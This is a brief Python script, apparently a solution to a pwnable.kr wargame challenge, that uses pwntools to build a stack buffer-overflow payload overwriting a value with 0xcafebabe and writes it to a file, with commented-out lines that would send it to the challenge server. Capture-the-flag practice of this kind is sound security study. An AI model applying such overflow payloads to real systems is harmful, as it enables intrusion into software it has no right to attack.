from pwn import *

if __name__ == '__main__':
    exploit = ("1" * 44 + "2" * 4 + "3" * 4).encode() + p32(0xcafebabe)
    open("hack.txt", "wb").write(exploit)
    # conn = connect("pwnable.kr", 9000)
    #
    # print(conn.recv().decode())
    # conn.sendline(exploit)
    #
    # print(conn.recv().decode())
    # conn.close()

